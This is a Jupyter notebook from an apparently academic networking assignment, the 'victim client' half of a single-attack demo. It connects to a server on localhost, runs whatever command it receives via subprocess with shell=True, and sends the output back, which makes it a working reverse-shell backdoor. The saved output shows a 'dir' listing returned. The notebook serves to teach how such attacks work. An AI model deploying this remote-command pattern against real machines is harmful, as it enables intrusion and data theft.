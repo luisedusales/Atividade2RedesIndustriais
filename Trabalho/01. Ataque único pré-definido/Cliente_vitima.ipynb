{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import subprocess\n",
    "import shlex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Declarar Host e Porta\n",
    "HOST = \"localhost\"\n",
    "PORT = 50000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Received b'dir'\n",
      "b' O volume na unidade C n\\xe3o tem nome.\\r\\n O N\\xfamero de S\\xe9rie do Volume \\xe9 E24F-8D8F\\r\\n\\r\\n Pasta de C:\\\\Users\\\\Acer\\\\OneDrive\\\\Documentos\\\\01. USP\\\\01 - Semestre Atual\\\\Redes\\\\Trabalho 2 - Lu\\xeds\\\\Trabalho\\\\01. Ataque \\xfanico pr\\xe9-definido\\r\\n\\r\\n26/11/2020  17:28    <DIR>          .\\r\\n26/11/2020  17:28    <DIR>          ..\\r\\n26/11/2020  16:57    <DIR>          .ipynb_checkpoints\\r\\n26/11/2020  17:28             1.486 Cliente_vitima.ipynb\\r\\n26/11/2020  17:28             2.170 Hacker_server.ipynb\\r\\n               2 arquivo(s)          3.656 bytes\\r\\n               3 pasta(s)   867.138.637.824 bytes dispon\\xedveis\\r\\n'\n"
     ]
    }
   ],
   "source": [
    "# create an INET, STREAMing socket\n",
    "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "  s.connect((HOST, PORT))\n",
    "  data = s.recv(1024)\n",
    "  print('Received', repr(data))\n",
    "  cmd = data.decode(\"utf-8\")\n",
    "  args = shlex.split(cmd)\n",
    "  process = subprocess.Popen(args,\n",
    "    stdout=subprocess.PIPE,\n",
    "    stderr=subprocess.PIPE,\n",
    "    shell=True\n",
    "  )\n",
    "  stdout = process.communicate()[0]\n",
    "  print(stdout)\n",
    "  s.sendall(stdout)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
